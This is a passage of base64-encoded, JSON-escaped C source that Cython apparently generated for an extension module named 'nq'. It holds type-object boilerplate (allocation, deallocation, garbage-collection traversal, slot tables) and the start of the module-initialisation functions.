VcbiAgI2VuZGlmXG4gIHtcbiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7XG4gICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7XG4gIH1cbiAgI2VuZGlmXG4gIHJldHVybiBvO1xufVxuXG5zdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndyhQeU9iamVjdCAqbykge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndyAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndyAqKW87XG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7XG4gICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cpIHtcbiAgICAgIGlmIChQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2MobykpIHJldHVybjtcbiAgICB9XG4gIH1cbiAgI2VuZGlmXG4gIFB5T2JqZWN0X0dDX1VuVHJhY2sobyk7XG4gIFB5X0NMRUFSKHAtPl9fcHl4X3ZfbGV0dGVycyk7XG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAoKChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgPCA4KSAmIChpbnQpKFB5X1RZUEUobyktPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cpKSkpIHtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3dbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndysrXSA9ICgoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgKilvKTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7XG4gICAgI2Vsc2VcbiAgICB7XG4gICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpO1xuICAgICAgaWYgKHRwX2ZyZWUpIHRwX2ZyZWUobyk7XG4gICAgfVxuICAgICNlbmRpZlxuICB9XG59XG5cbnN0YXRpYyBpbnQgX19weXhfdHBfdHJhdmVyc2VfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3KFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkge1xuICBpbnQgZTtcbiAgc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgKilvO1xuICB7XG4gICAgZSA9IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCAxLCB2LCBhKTtcbiAgICBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X3ZfbGV0dGVycykge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X3ZfbGV0dGVycywgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICByZXR1cm4gMDtcbn1cblxuc3RhdGljIGludCBfX3B5eF90cF9jbGVhcl8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3coUHlPYmplY3QgKm8pIHtcbiAgUHlPYmplY3QqIHRtcDtcbiAgc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgKilvO1xuICB0bXAgPSAoKFB5T2JqZWN0KilwLT5fX3B5eF92X2xldHRlcnMpO1xuICBwLT5fX3B5eF92X2xldHRlcnMgPSBQeV9Ob25lOyBQeV9JTkNSRUYoUHlfTm9uZSk7XG4gIFB5X1hERUNSRUYodG1wKTtcbiAgcmV0dXJuIDA7XG59XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG5zdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3dfc2xvdHNbXSA9IHtcbiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3d9LFxuICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3fSxcbiAge1B5X3RwX2NsZWFyLCAodm9pZCAqKV9fcHl4X3RwX2NsZWFyXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nd30sXG4gIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nd30sXG4gIHswLCAwfSxcbn07XG5zdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3dfc3BlYyA9IHtcbiAgIm5xLl9fcHl4X3Njb3BlX3N0cnVjdF8xX2d3IixcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3KSxcbiAgMCxcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLFxuICBfX3B5eF90eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nd19zbG90cyxcbn07XG4jZWxzZVxuXG5zdGF0aWMgUHlUeXBlT2JqZWN0IF9fcHl4X3R5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3ID0ge1xuICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMClcbiAgIm5xLiIiX19weXhfc2NvcGVfc3RydWN0XzFfZ3ciLCBcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3KSwgXG4gIDAsIFxuICBfX3B5eF90cF9kZWFsbG9jXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndywgXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNFxuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIFxuICAwLCBcbiAgX19weXhfdHBfdHJhdmVyc2VfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3LCBcbiAgX19weXhfdHBfY2xlYXJfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3LCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgX19weXhfdHBfbmV3XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndywgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIDAsIFxuICAjZWxzZVxuICBOVUxMLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMClcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDFcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMFxuICAwLCBcbiAgI2VuZGlmXG59O1xuI2VuZGlmXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykge1xuICBQeU9iamVjdCAqbztcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTtcbiAgbyA9IGFsbG9jX2Z1bmModCwgMCk7XG4gICNlbHNlXG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA+IDApICYgKGludCkodC0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSkpKSB7XG4gICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbLS1fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJdO1xuICAgIG1lbXNldChvLCAwLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikpO1xuICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpO1xuICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7XG4gICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7XG4gIH1cbiAgI2VuZGlmXG4gIHJldHVybiBvO1xufVxuXG5zdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5T2JqZWN0ICpvKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKW87XG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7XG4gICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikge1xuICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuO1xuICAgIH1cbiAgfVxuICAjZW5kaWZcbiAgUHlPYmplY3RfR0NfVW5UcmFjayhvKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfb3V0ZXJfc2NvcGUpO1xuICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfdl9fKTtcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpKSkpIHtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilvKTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7XG4gICAgI2Vsc2VcbiAgICB7XG4gICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpO1xuICAgICAgaWYgKHRwX2ZyZWUpIHRwX2ZyZWUobyk7XG4gICAgfVxuICAgICNlbmRpZlxuICB9XG59XG5cbnN0YXRpYyBpbnQgX19weXhfdHBfdHJhdmVyc2VfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoUHlPYmplY3QgKm8sIHZpc2l0cHJvYyB2LCB2b2lkICphKSB7XG4gIGludCBlO1xuICBzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilvO1xuICB7XG4gICAgZSA9IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCAxLCB2LCBhKTtcbiAgICBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X291dGVyX3Njb3BlKSB7XG4gICAgZSA9ICgqdikoKChQeU9iamVjdCAqKXAtPl9fcHl4X291dGVyX3Njb3BlKSwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfZ2VuZXhwcl9hcmdfMCkge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X3ZfXykge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X3ZfXywgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICByZXR1cm4gMDtcbn1cbiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3Nsb3RzW10gPSB7XG4gIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJ9LFxuICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJ9LFxuICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcn0sXG4gIHswLCAwfSxcbn07XG5zdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zcGVjID0ge1xuICAibnEuX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciIsXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSxcbiAgMCxcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLFxuICBfX3B5eF90eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3Nsb3RzLFxufTtcbiNlbHNlXG5cbnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9IHtcbiAgUHlWYXJPYmplY3RfSEVBRF9JTklUKDAsIDApXG4gICJucS4iIl9fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIiLCBcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpLCBcbiAgMCwgXG4gIF9fcHl4X3RwX2RlYWxsb2NfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIFxuICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLCBcbiAgMCwgXG4gIF9fcHl4X3RwX3RyYXZlcnNlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgMCwgXG4gICNlbmRpZlxuICAwLCBcbiAgMCwgXG4gIF9fcHl4X3RwX25ld18ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIDAsIFxuICAjZWxzZVxuICBOVUxMLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMClcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDFcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMFxuICAwLCBcbiAgI2VuZGlmXG59O1xuI2VuZGlmXG5cbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZXRob2RzW10gPSB7XG4gIHswLCAwLCAwLCAwfVxufTtcblxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRDYWNoZWRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRHbG9iYWxzKHZvaWQpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdENvbnN0YW50cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuXG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlIiwgMCk7XG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG59XG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF92YXJpYWJsZV9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUiLCAwKTtcbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbn1cblxuc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZSIsIDApO1xuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAwO1xufVxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUiLCAwKTtcbiAgXG4gICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwg